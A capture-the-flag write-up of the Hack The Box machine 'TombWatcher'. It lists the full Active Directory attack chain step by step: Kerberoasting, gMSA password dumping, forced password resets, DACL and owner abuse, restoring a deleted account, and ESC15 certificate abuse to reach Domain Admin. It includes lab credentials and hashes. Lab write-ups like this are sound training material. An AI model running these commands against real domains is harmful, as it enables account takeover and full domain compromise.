---
title: "TombWatcher - Hack The Box"
summary: "Difficulty: Medium 🟠"
---

<style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>

To start, we perform a quick scan with **Nmap** to identify **which ports are open** on the target machine.

```
sudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.72
```

![1](/images/writeups/tombwatcher/1.png)

Now we will perform a more **detailed scan** on these ports.

```
nmap -sCV -p53,80,135,139,389,445,3269,49712,49727 -n -Pn 10.10.11.72 -oN target
```

![2](/images/writeups/tombwatcher/2.png)

Let's add the domain to /etc/hosts.

![3](/images/writeups/tombwatcher/3.png)

HTB provides us with initial credentials for a user named Henry.

```
henry : H3nry_987TGV!
```

There’s nothing we can do with the website hosted on port 80, so the next step is to use [**SMBMap**](https://github.com/ShawnDEvans/smbmap) to enumerate **SMB shares** on the host and **check read/write permissions**, which could allow us to access sensitive files or upload malicious files.

```
smbmap -H tombwatcher.htb -u henry -p H3nry_987TGV!
```

![4](/images/writeups/tombwatcher/4.png)

After a few minutes of searching, I didn’t find anything.
The next step I have in mind is to use [**BloodHound**](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) to map the target’s **Active Directory** structure, identify relationships between **users**, **groups**, and **permissions**, and find potential **privilege escalation** paths within the domain.
(Quick guide on installing and using BloodHound: [**BloodHound**](https://conper.xyz/cybersecurity/hacking/windowsad/#bloodhound))

We obtain **domain information** using the following command:

```
bloodhound-python -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' -gc 'dc01.tombwatcher.htb' -ns 10.10.11.72 -v --zip -c all
```

Then we upload the resulting **ZIP** file to **BloodHound**.

We search for the user **Henry** and find that we have **WriteSPN** permission on the user **Alfred**.

![5](/images/writeups/tombwatcher/5.png)

Having **WriteSPN** on another user means we can modify their **SPN**, which is a unique identifier linking a **user** or **service account** to a service in the domain for **Kerberos authentication**. This allows us to perform a **Kerberoasting attack** to obtain their **password hash** and escalate privileges within the domain.

To do this, we first clone the **targetedKerberoast** repository.

```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
```

To perform the attack, we need to be time-synchronized.

```
sudo ntpdate tombwatcher.htb
```

In my case, I use **ntpdate** only to get the target machine’s time, then use **faketime**, because on **Kali** the time doesn’t sync properly. This way, we can simulate the domain time and make **Kerberos** work.

```
faketime 'YYYY-MM-DD HH:MM:SS' ./targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

![6](/images/writeups/tombwatcher/6.png)

We copy the **hash** and crack it with **John The Ripper**.

```
john -w=/usr/share/wordlists/rockyou.txt hash_alfred
```

![7](/images/writeups/tombwatcher/7.png)

With access to the **Alfred** account, we look in **BloodHound** for a new way to escalate to another user.

![8](/images/writeups/tombwatcher/8.png)

As we can see, we have the ability to add **Alfred** to the **INFRASTRUCTURE** group. Once **Alfred** is a member of this group, we gain **ReadGMSAPassword** permission on the user **ANSIBLE_DEV$**, which allows us to **read the password** of their Kerberos-managed account and use it to escalate privileges within the domain.

We use `bloodyAD` instead of `net rpc` because **bloodyAD** communicates directly with **Active Directory** via **LDAP** or modern **RPC** and can handle domain permissions that **net rpc** cannot. It is also more reliable for adding **users** to **groups** when **net rpc** fails due to restrictions or compatibility issues.

```
bloodyAD -u 'alfred' -p 'basketball' -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred

[+] alfred added to INFRASTRUCTURE
```

The next step is to exploit the **ReadGMSAPassword** permission, and **BloodHound** shows us how to perform the attack.

![9](/images/writeups/tombwatcher/9.png)

We clone the **gMSADumper** repository to our local machine.

```
git clone https://github.com/micahvandeusen/gMSADumper.git
```

And run the following command:

```
./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
```

![10](/images/writeups/tombwatcher/10.png)

With this **hash**, we can authenticate as **ANSIBLE_DEV$** on the domain, whether for **pass-the-hash**, **Kerberos attacks**, or **privilege escalation** to access restricted resources.

![11](/images/writeups/tombwatcher/11.png)

The next step is to force the **Sam** user to **change their password**. In this case, we use `bloodyAD` instead of `impacket-owneredit` because it allows us to work directly with **account hashes** in a simpler and more reliable way to change passwords **without needing the plaintext password**.

```
bloodyAD --host 10.10.11.72 -d 'tombwatcher.htb' -u 'ansible_dev$'  -p ':ecb4146b3f99e6bbf06ca896f504227c' set password SAM 'sam123'

[+] Password changed successfully!
```

![12](/images/writeups/tombwatcher/12.png)

Now that we have access to **Sam**, we can take advantage of his **WriteOwner** on **John**, which means we can **change the owner of John’s account** and modify his permissions to take control of his account or escalate privileges within the domain.

```
impacket-owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb/sam:sam123'
```

```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'sam123'
```

![13](/images/writeups/tombwatcher/13.png)

Now, taking advantage of the fact that **Sam** has **FullControl** over **John**, we change **John**’s password using **BloodyAD** with the following command:

```
bloodyAD --host 10.10.11.72 -d 'tombwatcher.htb'  -u 'sam' -p 'sam123' set password john 'john123'
```

![14](/images/writeups/tombwatcher/14.png)

With the user **John**, we can access his account and obtain the **User Flag**, which is located in his **Desktop** folder.

![15](/images/writeups/tombwatcher/15.png)

We now have control of the user **John**, who has **GenericAll** over the **ADCS** OU. This OU corresponds to the **Active Directory Certificate Services** infrastructure, which **manages certificate** issuance and usage within the domain.

With this control, we can abuse the certificate configuration, and to do so, we use [**Certipy-AD**](https://www.kali.org/tools/certipy-ad/), which allows us to **enumerate**, **create**, and **request misconfigured certificates** to escalate privileges within the domain.

```
certipy-ad find -u 'john@tombwatcher.htb' -p 'john123' -dc-ip 10.10.11.72
```

![16](/images/writeups/tombwatcher/16.png)

![17](/images/writeups/tombwatcher/17.png)

In the **WebServer certificate template**, we encounter a **SID** (S-1-5-21-1392491010-1358638721-2126982587-1111), so we decide to search the system to see which **user** or **group** it belongs to.

```
Get-ADObject -Filter {ObjectSID -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"} -Properties *
```

Nothing is found, so this **SID** likely corresponds to a **deleted user or group** or a special internal domain object that no longer exists.

To verify if the **SID** corresponds to a deleted object in **Active Directory**, you can use **PowerShell** with the **ActiveDirectory** module and search in the **Deleted Objects tomb**.

```
Get-ADObject -Filter {ObjectSID -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"} -IncludeDeletedObjects -Properties * 
```

This will search the **deleted objects** and show whether that **SID** corresponds to a deleted user or group.

Result:

```
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADObject -Filter {ObjectSID -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"} -IncludeDeletedObjects -Properties *

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

**We can restore the deleted user cert_admin** because it is still in the **Deleted Objects** tomb of **Active Directory**. This is confirmed by several indicators in the information we obtained: `isDeleted: True shows` the object exists but is deleted, and `LastKnownParent: OU=ADCS` shows where it was located before deletion. Additionally, since we have **GenericAll** over the **ADCS** OU with the user **John**, we have the necessary permissions to restore it.

```
Get-ADObject -Filter {ObjectSID -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"} -IncludeDeletedObjects | Restore-ADObject
```

Next, we perform a new d**omain mapping** from inside, using **SharpHound.exe**.

```
wget https://github.com/SpecterOps/SharpHound/releases/download/v2.7.1/SharpHound_v2.7.1_windows_x86.zip
unzip SharpHound_v2.7.1_windows_x86.zip
```

We **upload** the executable to the machine with **Evil-WinRM**:

```
upload SharpHound.exe
```

And run a full domain scan.

```
.\SharpHound.exe -c All -d tombwatcher.htb
```

Finally, we **download** the resulting **ZIP** file using the download command followed by the file name.

![18](/images/writeups/tombwatcher/18.png)

We upload it to **BloodHound**, which now shows much more information about **John** than before.

![19](/images/writeups/tombwatcher/19.png)

The **Cert_Admin** user has been successfully restored, and since we have **GenericAll** over it, we proceed to change its password.

```
bloodyAD --host 10.10.11.72 -d 'tombwatcher.htb' -u 'john' -p 'john123' set password 'cert_admin' 'admin1234'

[+] Password changed successfully!
```

We then run **Certipy-ad** again, but this time using the **Cert_Admin** user to **search for vulnerable certificates**.

```
certipy-ad find -u cert_admin -p 'admin1234' -dc-ip 10.10.11.72 -vulnerable
```

Result:

```
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

The **WebServer template** has a vulnerability (**ESC15**) that **allows us to create a certificate as if we were another user**. This means we could gain access to important accounts, including **Domain Admin**, and use it to escalate privileges within the domain. Instructions for exploitation: [**ESC15**](https://www.hackingarticles.in/adcs-esc15-exploiting-template-schema-v1/)

To exploit the vulnerability, we first request a certificate in the name of the **Administrator** using **Certipy**.

```
certipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p 'admin1234' -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Client Authentication'
```

This command generates a **.pfx** file containing the certificate with **Administrator** privileges.

Next, we use that certificate to **authenticate** and open an **LDAP session with administrative access**.

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
```

This gives us a **Domain Admin** session, allowing us to control the domain and execute critical actions.

![20](/images/writeups/tombwatcher/20.png)

Using the `help` command, we see what actions can be executed.

![21](/images/writeups/tombwatcher/21.png)

We can change the **Administrator** user’s password.

![22](/images/writeups/tombwatcher/22.png)

![23](/images/writeups/tombwatcher/23.png)

Finally, we obtain the **Root Flag** and complete the machine!!